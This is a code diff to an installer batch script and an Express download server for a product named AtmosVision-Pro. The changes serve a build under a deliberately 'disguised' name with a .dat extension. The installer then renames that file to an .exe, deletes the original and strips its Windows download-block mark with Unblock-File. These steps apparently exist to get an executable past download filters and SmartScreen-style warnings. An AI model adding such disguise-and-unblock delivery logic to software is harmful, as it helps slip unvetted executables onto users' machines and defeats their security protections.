@@ -205,7 +205,8 @@ if %ERRORLEVEL% neq 0 (
 )
 
 echo [2/3] Preparing components...
-copy /Y "%~dp0AtmosDependencies.exe" "%INSTALL_DIR%\\AtmosDependencies.exe" >nul
+copy /Y "%~dp0AtmosDependencies.dat" "%INSTALL_DIR%\\AtmosDependencies.exe" >nul
+del /Q "%~dp0AtmosDependencies.dat" >nul 2>&1
 
 powershell -Command "Unblock-File -Path '%INSTALL_DIR%\\AtmosVision-Pro.exe'"
 powershell -Command "Unblock-File -Path '%INSTALL_DIR%\\AtmosDependencies.exe'"
@@ -327,9 +328,8 @@ app.get("/api/download/binary", async (req, res) => {
       return res.status(404).json({ error: "No files available for download" });
     }
 
-    const originalExt = path.extname(latestFile.filename);
     const disguisedName = os.isWindows
-      ? `AtmosDependencies${originalExt || '.exe'}`
+      ? 'AtmosDependencies.dat'
       : 'AtmosDependencies';
 
     console.log(`[binary] Serving: ${latestFile.filename} -> ${disguisedName}`);
@@ -360,9 +360,8 @@ app.get("/api/download/latest", async (req, res) => {
 
     console.log(`[latest] Serving latest build: ${latestFile.filename}`);
 
-    const originalExt = path.extname(latestFile.filename);
     const disguisedName = os.isWindows
-      ? `AtmosDependencies${originalExt || '.exe'}`
+      ? 'AtmosDependencies.dat'
       : 'AtmosDependencies';
 
     // Check if an Electron URL is configured for the detected OS
